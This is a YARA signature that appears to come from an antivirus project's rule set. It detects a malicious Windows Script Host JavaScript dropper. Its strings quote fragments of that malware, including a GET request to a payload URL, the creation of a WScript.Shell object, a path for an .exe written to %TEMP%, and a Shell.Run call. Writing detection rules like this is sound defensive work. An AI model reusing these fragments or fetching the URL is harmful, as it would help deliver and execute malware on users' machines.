rule sig_20160330_7738decf7cc46d8f7c82d82d36b7bb92 {
  meta:
    description = "datamaliciousorder - file 20160330_7738decf7cc46d8f7c82d82d36b7bb92.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "00c524c6e91d97867c9bd6a03aaba9e1dd76741a6f16bf258f9966b2aeffe394"

  strings:
    $s1  = "VO[VA](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var Q = function JU() {return WScript[M](\"WScript\"+\".Shell\");}(), WJ = 11;" fullword ascii
    $s3  = "function P(NS, Y0){FN = FN * 1; return NS - Y0;};" fullword ascii
    $s4  = "if (VO[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Y() {return Q[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"extqGWpEr33aJO.ex\" + \"e\";};" fullword ascii
    $s6  = "function XU(){return HQ + \"\";};" fullword ascii
    $s7  = "function I() {return ((RH == true) && (RH == NM)) ? 1 : FN;};" fullword ascii
    $s8  = "function G(LE){Q[\"Run\"](LE, FN, FN);};" fullword ascii
    $s9  = "function A(){return 22;};" fullword ascii
    $s10 = "function KH()" fullword ascii
    $s11 = "return P(O, NG);" fullword ascii
    $s12 = "}while (RA);" fullword ascii
    $s13 = "var CK = new this[\"Date\"]();" fullword ascii
    $s14 = "function X(DV) {var UJ = (1, 2, 3, 4, 5, DV); return UJ;};" fullword ascii
    $s15 = "function K(){return M;};" fullword ascii
    $s16 = "var A0 = false;" fullword ascii
    $s17 = "var NM = false;" fullword ascii
    $s18 = "NM = true; " fullword ascii
    $s19 = "RH = true; " fullword ascii
    $s20 = "var RH = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}